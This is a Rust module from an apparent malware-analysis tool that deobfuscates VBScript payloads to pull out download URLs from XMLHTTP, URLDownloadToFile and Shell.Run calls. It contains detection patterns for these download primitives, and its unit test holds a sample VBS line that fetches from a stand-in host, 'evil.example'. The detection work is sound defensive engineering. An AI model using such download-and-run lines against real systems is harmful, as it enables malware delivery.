//! VBScript payload post-processing: extract URLs from VBS payloads.
//! Common patterns: MSXML2.XMLHTTP, WinHTTP.WinHTTPRequest, URLDownloadToFile.

use crate::env::Environment;
use crate::traits::Trait;
use once_cell::sync::Lazy;
use regex::Regex;
use std::collections::HashMap;

type VbsStringBindings = HashMap<String, String>;
type VbsArrayBindings = HashMap<String, Vec<String>>;

#[allow(clippy::expect_used)]
static XMLHTTP_OPEN_RE: Lazy<Regex> = Lazy::new(|| {
    // http.Open "GET", "url", False  /  http.Open "POST", "url", False
    Regex::new(r#"(?i)\.Open\s*[("]?\s*"[A-Z]+"\s*,\s*"([^"]+)""#).expect("xmlhttp")
});

#[allow(clippy::expect_used)]
static XMLHTTP_OPEN_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\.Open\s*[("]?\s*"[A-Z]+"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\b"#)
        .expect("xmlhttp variable")
});

#[allow(clippy::expect_used)]
static VBS_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?im)^\s*(?:Const\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*$"#)
        .expect("vbs string assignment")
});

#[allow(clippy::expect_used)]
static SAVETOFILE_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.SaveToFile\s*\(?\s*"([^"]+)""#).expect("savetofile"));

#[allow(clippy::expect_used)]
static URLDOWN_RE: Lazy<Regex> = Lazy::new(|| {
    // URLDownloadToFile
    Regex::new(r#"(?i)URLDownloadToFile[^"]*"([^"]+)""#).expect("urldown")
});

#[allow(clippy::expect_used)]
static URLDOWN_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)URLDownloadToFile\s*\(?\s*[^,\r\n]+,\s*([A-Za-z_][A-Za-z0-9_]*)\b"#)
        .expect("urldown variable")
});

#[allow(clippy::expect_used)]
static SHELL_RUN_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.Run\s*\(?\s*"([^"]+)""#).expect("wscript shell run"));

#[allow(clippy::expect_used)]
static SHELL_RUN_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\.Run\s*\(?\s*([A-Za-z_][A-Za-z0-9_]*)\b"#)
        .expect("wscript shell run variable")
});

pub fn scan_vbs_payloads(env: &mut Environment) {
    let mut payloads = std::mem::take(&mut env.all_extracted_vbs);
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
    'payloads: for (idx, payload) in payloads.iter().enumerate() {
        if env.check_deadline() {
            break;
        }
        let raw = String::from_utf8_lossy(payload);
        let uncommented = strip_vbs_apostrophe_comments(&raw);
        let text = join_vbs_line_continuations(&uncommented);
        let mut bindings: VbsStringBindings = HashMap::new();
        let mut array_bindings: VbsArrayBindings = HashMap::new();
        for line in text.lines() {
            if env.check_deadline() {
                break 'payloads;
            }
            for statement in split_vbs_statements(line) {
                let Some(caps) = VBS_STRING_ASSIGN_RE.captures(statement) else {
                    continue;
                };
                let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
                    continue;
                };
                let key = name.as_str().to_ascii_lowercase();
                if let Some(values) =
                    parse_vbs_array_values(value.as_str(), &bindings, &array_bindings)
                {
                    array_bindings.insert(key, values);
                    continue;
                }
                let Some(value) = eval_vbs_string_expr(value.as_str(), &bindings, &array_bindings)
                else {
                    continue;
                };
                bindings.insert(key, value);
            }
        }
        let dst_hint: Option<String> = SAVETOFILE_RE
            .captures(&text)
            .and_then(|c| c.get(1).map(|m| m.as_str().to_string()));
        let regexes: &[&Lazy<Regex>] = &[&XMLHTTP_OPEN_RE, &URLDOWN_RE];
        for re in regexes {
            for caps in re.captures_iter(&text) {
                if env.check_deadline() {
                    break 'payloads;
                }
                let Some(url_match) = caps.get(1) else {
                    continue;
                };
                let Some(url) = crate::deob_scan::normalize_liberal_url_token(url_match.as_str())
                else {
                    continue;
                };
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                let snippet: String = text.chars().take(120).collect();
                env.traits.push(Trait::Download {
                    cmd: format!("(vbs #{idx}) {snippet}"),
                    src: url,
                    dst: dst_hint.clone(),
                });
            }
        }

        for caps in SHELL_RUN_RE.captures_iter(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(command) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            push_downloads_from_vbs_command(env, idx, &text, command, &dst_hint, &mut seen);
        }

        for caps in SHELL_RUN_VAR_RE.captures_iter(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(var_match) = caps.get(1) else {
                continue;
            };
            let Some(command) = bindings.get(&var_match.as_str().to_ascii_lowercase()) else {
                continue;
            };
            push_downloads_from_vbs_command(env, idx, &text, command, &dst_hint, &mut seen);
        }

        for expr in extract_shell_run_command_exprs(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(command) = eval_vbs_string_expr(expr, &bindings, &array_bindings) else {
                continue;
            };
            push_downloads_from_vbs_command(env, idx, &text, &command, &dst_hint, &mut seen);
        }

        for expr in extract_xmlhttp_open_url_exprs(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(url) = eval_vbs_string_expr(expr, &bindings, &array_bindings)
                .and_then(|value| crate::deob_scan::normalize_liberal_url_token(&value))
            else {
                continue;
            };
            if !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet: String = text.chars().take(120).collect();
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst_hint.clone(),
            });
        }

        for expr in extract_urldownloadtofile_url_exprs(&text) {
            if env.check_deadline() {
                break 'payloads;
            }
            let Some(url) = eval_vbs_string_expr(expr, &bindings, &array_bindings)
                .and_then(|value| crate::deob_scan::normalize_liberal_url_token(&value))
            else {
                continue;
            };
            if !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet: String = text.chars().take(120).collect();
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst_hint.clone(),
            });
        }

        for re in [&XMLHTTP_OPEN_VAR_RE, &URLDOWN_VAR_RE] {
            for caps in re.captures_iter(&text) {
                if env.check_deadline() {
                    break 'payloads;
                }
                let Some(var_match) = caps.get(1) else {
                    continue;
                };
                let Some(url) = bindings.get(&var_match.as_str().to_ascii_lowercase()) else {
                    continue;
                };
                let Some(url) = crate::deob_scan::normalize_liberal_url_token(url) else {
                    continue;
                };
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                let snippet: String = text.chars().take(120).collect();
                env.traits.push(Trait::Download {
                    cmd: format!("(vbs #{idx}) {snippet}"),
                    src: url,
                    dst: dst_hint.clone(),
                });
            }
        }
    }
    payloads.append(&mut env.all_extracted_vbs);
    env.all_extracted_vbs = payloads;
}

fn extract_shell_run_command_exprs(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        let mut cursor = 0usize;
        while let Some(rel) = lower[cursor..].find(".run") {
            let run_start = cursor + rel;
            let args_start = run_start + ".run".len();
            let next = line[args_start..].chars().next();
            if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(expr) = parts.first() {
                out.push(*expr);
            }
            cursor = args_start;
        }
    }
    out
}

fn extract_xmlhttp_open_url_exprs(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        let mut cursor = 0usize;
        while let Some(rel) = lower[cursor..].find(".open") {
            let open_start = cursor + rel;
            let args_start = open_start + ".open".len();
            let next = line[args_start..].chars().next();
            if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(expr) = parts.get(1) {
                out.push(*expr);
            }
            cursor = args_start;
        }
    }
    out
}

fn extract_urldownloadtofile_url_exprs(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        let mut cursor = 0usize;
        while let Some(rel) = lower[cursor..].find("urldownloadtofile") {
            let call_start = cursor + rel;
            let args_start = call_start + "urldownloadtofile".len();
            let next = line[args_start..].chars().next();
            if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(expr) = parts.get(1) {
                out.push(*expr);
            }
            cursor = args_start;
        }
    }
    out
}

fn push_downloads_from_vbs_command(
    env: &mut Environment,
    idx: usize,
    text: &str,
    command: &str,
    dst_hint: &Option<String>,
    seen: &mut std::collections::HashSet<(usize, String)>,
) {
    for url_caps in crate::deob_scan::URL_RE.captures_iter(command) {
        let Some(raw_url) = url_caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(url) = crate::deob_scan::normalize_liberal_url_token(raw_url) else {
            continue;
        };
        if crate::deob_scan::is_noise_url(&url) || !seen.insert((idx, url.clone())) {
            continue;
        }
        let snippet: String = text.chars().take(120).collect();
        env.traits.push(Trait::Download {
            cmd: format!("(vbs #{idx}) {snippet}"),
            src: url,
            dst: dst_hint.clone(),
        });
    }
}

fn join_vbs_line_continuations(text: &str) -> String {
    let mut out = String::new();
    for line in text.lines() {
        let trimmed_end = line.trim_end();
        if let Some(prefix) = trimmed_end.strip_suffix('_') {
            out.push_str(prefix.trim_end());
            out.push(' ');
        } else {
            out.push_str(line);
            out.push('\n');
        }
    }
    out
}

fn strip_vbs_apostrophe_comments(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for line in text.lines() {
        let bytes = line.as_bytes();
        let mut in_quote = false;
        let mut i = 0usize;
        let mut cut = line.len();
        while i < bytes.len() {
            match bytes[i] {
                b'"' => {
                    if in_quote && bytes.get(i + 1) == Some(&b'"') {
                        i += 2;
                        continue;
                    }
                    in_quote = !in_quote;
                    i += 1;
                }
                b'\'' if !in_quote => {
                    cut = i;
                    break;
                }
                _ => i += 1,
            }
        }
        out.push_str(line[..cut].trim_end());
        out.push('\n');
    }
    out
}

fn split_vbs_statements(line: &str) -> Vec<&str> {
    let mut statements = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let bytes = line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b':' if !in_quote => {
                statements.push(line[start..i].trim());
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    statements.push(line[start..].trim());
    statements
}

fn eval_vbs_string_expr(
    expr: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let mut out = String::new();
    let mut saw_part = false;
    for part in split_vbs_concat(expr) {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some(value) = parse_vbs_string_literal(part) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(ch) = parse_vbs_chr(part) {
            out.push(ch);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_string_transform(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_split_index(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_cstr(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_replace(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_mid(part, bindings, array_bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        let key = part.trim_matches(['(', ')']).to_ascii_lowercase();
        if let Some(value) = bindings.get(&key) {
            out.push_str(value);
            saw_part = true;
            continue;
        }
        return None;
    }
    saw_part.then_some(out)
}

fn split_vbs_concat(expr: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let mut paren_depth = 0usize;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b'(' if !in_quote => {
                paren_depth += 1;
                i += 1;
            }
            b')' if !in_quote => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b'&' | b'+' if !in_quote && paren_depth == 0 => {
                parts.push(&expr[start..i]);
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    parts.push(&expr[start..]);
    parts
}

fn parse_vbs_string_literal(part: &str) -> Option<String> {
    let part = part.trim();
    if !part.starts_with('"') || !part.ends_with('"') || part.len() < 2 {
        return None;
    }
    Some(part[1..part.len() - 1].replace("\"\"", "\""))
}

fn parse_vbs_chr(part: &str) -> Option<char> {
    let inner = vbs_function_args(part, "chr").or_else(|| vbs_function_args(part, "chrw"))?;
    let value = parse_vbs_integer(inner)?;
    char::from_u32(value)
}

fn parse_vbs_integer(value: &str) -> Option<u32> {
    let value = value.trim();
    if value.is_empty() {
        return None;
    }
    if let Some(integer) = parse_vbs_integer_atom(value) {
        return Some(integer);
    }

    parse_vbs_integer_sum(value)
}

fn parse_vbs_integer_atom(value: &str) -> Option<u32> {
    let value = value.trim();
    if let Some(hex) = value
        .strip_prefix("&h")
        .or_else(|| value.strip_prefix("&H"))
        .or_else(|| value.strip_prefix("0x"))
        .or_else(|| value.strip_prefix("0X"))
    {
        u32::from_str_radix(hex.trim(), 16).ok()
    } else {
        value.parse().ok()
    }
}

fn parse_vbs_integer_sum(value: &str) -> Option<u32> {
    let mut acc = 0i64;
    let mut sign = 1i64;
    let mut start = 0usize;
    let mut saw_operator = false;
    let mut saw_term = false;
    let bytes = value.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'+' | b'-' => {
                let term = value[start..i].trim();
                if term.is_empty() {
                    if !saw_term {
                        sign = if bytes[i] == b'-' { -1 } else { 1 };
                        start = i + 1;
                        i += 1;
                        continue;
                    }
                    return None;
                }
                acc += sign * i64::from(parse_vbs_integer_atom(term)?);
                saw_term = true;
                saw_operator = true;
                sign = if bytes[i] == b'-' { -1 } else { 1 };
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    let term = value[start..].trim();
    if term.is_empty() {
        return None;
    }
    acc += sign * i64::from(parse_vbs_integer_atom(term)?);
    if saw_operator && (0..=i64::from(u32::MAX)).contains(&acc) {
        Some(acc as u32)
    } else {
        None
    }
}

fn parse_vbs_string_transform(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let lower = part.trim().to_ascii_lowercase();
    if let Some(inner) = vbs_function_args(part, "strreverse") {
        let value = eval_vbs_string_expr(inner, bindings, array_bindings)?;
        return Some(value.chars().rev().collect());
    }
    if let Some(inner) = vbs_function_args(part, "lcase") {
        return Some(eval_vbs_string_expr(inner, bindings, array_bindings)?.to_ascii_lowercase());
    }
    if let Some(inner) = vbs_function_args(part, "ucase") {
        return Some(eval_vbs_string_expr(inner, bindings, array_bindings)?.to_ascii_uppercase());
    }
    if let Some(inner) = vbs_function_args(part, "trim") {
        return Some(
            eval_vbs_string_expr(inner, bindings, array_bindings)?
                .trim()
                .to_string(),
        );
    }
    if let Some(inner) = vbs_function_args(part, "ltrim") {
        return Some(
            eval_vbs_string_expr(inner, bindings, array_bindings)?
                .trim_start()
                .to_string(),
        );
    }
    if let Some(inner) = vbs_function_args(part, "rtrim") {
        return Some(
            eval_vbs_string_expr(inner, bindings, array_bindings)?
                .trim_end()
                .to_string(),
        );
    }
    if let Some(inner) = vbs_function_args(part, "join") {
        let args = split_vbs_args(inner);
        if args.len() < 2 {
            return None;
        }
        let values = parse_vbs_array_values(args[0], bindings, array_bindings)?;
        let separator = eval_vbs_string_expr(args[1], bindings, array_bindings)?;
        return Some(values.join(&separator));
    }
    if lower.starts_with("left(") {
        let args = split_vbs_args(vbs_function_args(part, "left")?);
        if args.len() < 2 {
            return None;
        }
        let value = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
        let count = parse_vbs_integer(args[1])? as usize;
        return Some(value.chars().take(count).collect());
    }
    if lower.starts_with("right(") {
        let args = split_vbs_args(vbs_function_args(part, "right")?);
        if args.len() < 2 {
            return None;
        }
        let value = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
        let count = parse_vbs_integer(args[1])? as usize;
        let chars: Vec<char> = value.chars().collect();
        let start = chars.len().saturating_sub(count);
        return Some(chars.into_iter().skip(start).collect());
    }
    None
}

fn parse_vbs_split_index(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let trimmed = part.trim();
    let lower = trimmed.to_ascii_lowercase();
    if !lower.starts_with("split(") || !trimmed.ends_with(')') {
        return None;
    }
    let idx_start = trimmed.rfind(")(")?;
    let call = &trimmed[..idx_start + 1];
    let index = parse_vbs_integer(trimmed[idx_start + 2..trimmed.len() - 1].trim())? as usize;
    let inner = vbs_function_args(call, "split")?;
    let pieces = parse_vbs_split_values(inner, bindings, array_bindings)?;
    pieces.get(index).cloned()
}

fn parse_vbs_array_values(
    expr: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<Vec<String>> {
    let key = expr.trim().trim_matches(['(', ')']).to_ascii_lowercase();
    if let Some(values) = array_bindings.get(&key) {
        return Some(values.clone());
    }
    if let Some(inner) = vbs_function_args(expr, "split") {
        return parse_vbs_split_values(inner, bindings, array_bindings);
    }
    let inner = vbs_function_args(expr, "array")?;
    let mut values = Vec::new();
    for arg in split_vbs_args(inner) {
        let value = eval_vbs_string_expr(arg, bindings, array_bindings)?;
        values.push(value);
    }
    Some(values)
}

fn parse_vbs_split_values(
    inner: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<Vec<String>> {
    let args = split_vbs_args(inner);
    if args.is_empty() {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
    let separator = if let Some(sep_expr) = args.get(1) {
        eval_vbs_string_expr(sep_expr, bindings, array_bindings)?
    } else {
        " ".to_string()
    };
    Some(if separator.is_empty() {
        source.chars().map(|c| c.to_string()).collect()
    } else {
        source.split(&separator).map(|s| s.to_string()).collect()
    })
}

fn parse_vbs_cstr(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let inner = vbs_function_args(part, "cstr")?;
    eval_vbs_string_expr(inner, bindings, array_bindings)
}

fn parse_vbs_replace(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let inner = vbs_function_args(part, "replace")?;
    let args = split_vbs_args(inner);
    if args.len() < 3 {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
    let find = eval_vbs_string_expr(args[1], bindings, array_bindings)?;
    let replacement = eval_vbs_string_expr(args[2], bindings, array_bindings)?;
    Some(source.replace(&find, &replacement))
}

fn parse_vbs_mid(
    part: &str,
    bindings: &VbsStringBindings,
    array_bindings: &VbsArrayBindings,
) -> Option<String> {
    let inner = vbs_function_args(part, "mid")?;
    let args = split_vbs_args(inner);
    if args.len() < 2 {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings, array_bindings)?;
    let start = parse_vbs_integer(args[1])? as usize;
    let skip = start.saturating_sub(1);
    let chars: Vec<char> = source.chars().collect();
    if skip >= chars.len() {
        return Some(String::new());
    }
    let take = args
        .get(2)
        .and_then(|arg| parse_vbs_integer(arg).map(|value| value as usize))
        .unwrap_or(chars.len() - skip);
    Some(chars.into_iter().skip(skip).take(take).collect())
}

fn vbs_function_args<'a>(part: &'a str, name: &str) -> Option<&'a str> {
    let part = part.trim();
    let lower = part.to_ascii_lowercase();
    let prefix_len = name.len();
    if !lower.starts_with(name) {
        return None;
    }
    let open = skip_ascii_ws(part, prefix_len);
    if part.as_bytes().get(open) != Some(&b'(') {
        return None;
    }
    let inner = part.get(open + 1..part.len().checked_sub(1)?)?;
    part.ends_with(')').then_some(inner)
}

fn skip_ascii_ws(text: &str, mut idx: usize) -> usize {
    while text
        .as_bytes()
        .get(idx)
        .is_some_and(u8::is_ascii_whitespace)
    {
        idx += 1;
    }
    idx
}

fn split_vbs_args(expr: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let mut paren_depth = 0usize;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b'(' if !in_quote => {
                paren_depth += 1;
                i += 1;
            }
            b')' if !in_quote => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b',' if !in_quote && paren_depth == 0 => {
                parts.push(expr[start..i].trim());
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    parts.push(expr[start..].trim());
    parts
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, Instant};

    #[test]
    fn vbs_scan_honors_expired_deadline() {
        let mut env = Environment::default();
        env.limits.deadline = Some(Instant::now() - Duration::from_secs(1));
        env.all_extracted_vbs
            .push(br#"x.Open "GET", "http://evil.example/p", False"#.to_vec());

        scan_vbs_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
            "no TimeoutHit emitted: {:?}",
            env.traits
        );
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::Download { .. })),
            "deadline-expired scan still emitted Download: {:?}",
            env.traits
        );
        assert_eq!(
            env.all_extracted_vbs.len(),
            1,
            "deadline path dropped extracted VBS payloads"
        );
    }
}
